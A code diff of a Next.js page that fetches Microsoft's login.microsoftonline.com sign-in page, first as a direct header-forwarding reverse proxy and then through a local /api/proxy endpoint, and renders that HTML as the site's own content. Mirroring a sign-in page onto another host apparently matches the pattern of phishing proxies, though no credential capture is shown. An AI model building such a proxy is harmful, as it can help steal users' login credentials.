@@ -1,26 +1,26 @@
 export async function getServerSideProps(context) {
-    const upstream = 'login.microsoftonline.com';
-    const upstream_path = '/';
-    const https = true;
+    try {
+        const url = `http://${context.req.headers.host}/api/proxy?url=https://login.microsoftonline.com/`;
 
-    const url = new URL('/', `http://${context.req.headers.host}`);
-    url.host = upstream;
-    url.protocol = https ? 'https:' : 'http:';
-    url.pathname = upstream_path;
-
-    const fetchOptions = {
-        method: context.req.method,
-        headers: { ...context.req.headers, Host: upstream, Referer: `${url.protocol}//${context.req.headers.host}` }
-    };
-
-    const response = await fetch(url.href, fetchOptions);
-    const text = await response.text();
-
-    return {
-        props: {
-            content: text
+        const res = await fetch(url);
+        if (!res.ok) {
+            throw new Error('Network response was not ok');
         }
-    };
+        const text = await res.text();
+
+        return {
+            props: {
+                content: text
+            }
+        };
+    } catch (error) {
+        console.error('Error fetching content:', error);
+        return {
+            props: {
+                content: 'Error fetching content'
+            }
+        };
+    }
 }
 
 export default function Home({ content }) {
